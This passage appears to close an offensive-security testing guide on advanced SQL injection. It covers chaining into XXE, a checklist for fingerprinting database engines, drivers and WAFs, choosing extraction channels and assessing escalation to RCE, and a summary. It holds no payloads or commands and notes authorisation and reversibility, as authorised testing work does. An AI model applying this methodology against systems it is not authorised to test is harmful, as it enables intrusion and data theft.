- **XXE via SQL** — MySQL's `LOAD_XML`, MSSQL `nodes()`/`.query()`, Oracle `XMLType` all take XML inputs; a SQLi that reaches an XML parser is an XXE chain. Route to `xxe` for the XML-specific technique catalog.

## Testing Depth Checklist

- [ ] Engine and version fingerprinted (error string, `@@version`, catalog view, driver banner)
- [ ] Driver mode fingerprinted (`preferQueryMode`, `useServerPrepStmts`, `allowMultiQueries`, `sendStringParametersAsUnicode`)
- [ ] WAF fingerprinted (headers, tokenizer response to boundary payloads, rate-limit shape)
- [ ] Oracle established (error / boolean / time / OAST / EXPLAIN / cache differential) with 5-sample confidence
- [ ] Family classified (value-position vs identifier-position; base file's discipline)
- [ ] Extraction channel established (UNION / error / blind / OAST / EXPLAIN)
- [ ] Second-order sweep completed (payloads seeded, admin/log/reporting endpoints traversed)
- [ ] Chain reach assessed (auth bypass, SSRF, file write, RCE) with each hop routed by filename
- [ ] Version boundary verified for any CVE-tagged claim (base file's discipline: primary source or version-fingerprint mitigation)
- [ ] Reversibility documented (rollback path, no destructive changes without explicit auth)

## Summary

Advanced SQLi is layered fingerprinting — engine, driver, WAF, framework decoder — and disciplined confirmation. A real finding names which family (value vs identifier), which engine and version, which extraction channel, and which chain routes to durable impact. Where the base's primary techniques don't survive the target's defenses, the depth here does; where the target sits on a 2024–2026 release, the novel sibling owns the frontier.
